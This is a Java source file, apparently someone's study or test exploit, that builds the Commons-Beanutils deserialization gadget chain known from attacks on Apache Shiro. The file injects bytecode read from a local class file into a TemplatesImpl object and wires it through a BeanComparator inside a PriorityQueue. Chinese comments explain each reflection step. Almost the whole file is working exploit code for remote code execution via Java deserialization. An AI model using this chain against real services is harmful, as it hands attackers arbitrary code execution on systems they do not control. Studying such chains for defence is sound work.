import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

/**
 * commons-beanutils 1.8.3
 */
public class ShiroCB {
    public static void main(String[] args) throws Exception {
        //        CC3
        TemplatesImpl templates = new TemplatesImpl();

        Class c = templates.getClass();
        Field fieldName = c.getDeclaredField("_name");
//        为了满足if判断逻辑
        fieldName.setAccessible(true);
        fieldName.set(templates,"aaa");
//         获取字节码属性
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);

//        获取字节码
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        //        不进行序列化时触发需要的一个属性
//        Field tfactory = c.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());

        PropertyUtils.getProperty(templates,"outputProperties");

//        CB。注意构造方法，不要将CC链中的东西加入
        BeanComparator beanComparator = new BeanComparator("outputProperties",new AttrCompare());


//        CC2第一种写法，较复杂
/*//        PriorityQueue.readObject中会触发comparator.compare。这里当add第二个值时会触发comparator.compare,所以这里还是先填充其他的Comparator
        PriorityQueue<Object> o = new PriorityQueue<>(2,null);
//        过 heapify()的 size >>> 1判断逻辑    “2 >>> 1”  0000 0010  -> 0000 0001
//        “>>>” 右移 补0 以8位为单位
        o.add(1);
        o.add(1);

//        再通过反射填充回装有invokerTransformer的transformingComparator
        Class<? extends PriorityQueue> oClass = o.getClass();
        Field oClassDeclaredField = oClass.getDeclaredField("comparator");
        oClassDeclaredField.setAccessible(true);
        oClassDeclaredField.set(o,beanComparator);
        Field queueField = oClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queue = (Object[]) queueField.get(o);
//        queueField.set(o,new Object[]{templates,1});
        queue[0]=templates;
        queue[1]=1;*/



//        CC2第二种写法，较简单直接copy，因为最后改回了beanComparator，所以CC中的东西并不会出现。
//        PriorityQueue.readObject中会触发comparator.compare。这里当add第二个值时会触发comparator.compare,所以这里还是先填充其他的transformingComparator
        PriorityQueue<Object> o = new PriorityQueue<>(2,new TransformingComparator(new ConstantTransformer(1)));
//        过 heapify()的 size >>> 1判断逻辑    “2 >>> 1”  0000 0010  -> 0000 0001
//        “>>>” 右移 补0 以8位为单位
        o.add(templates);
        o.add(1);

//        再通过反射填充回装有invokerTransformer的transformingComparator
        Class<? extends PriorityQueue> oClass = o.getClass();
        Field oClassDeclaredField = oClass.getDeclaredField("comparator");
        oClassDeclaredField.setAccessible(true);
        oClassDeclaredField.set(o,beanComparator);

//        Utils.serialize(o);
//        Utils.EXP();
    }
}
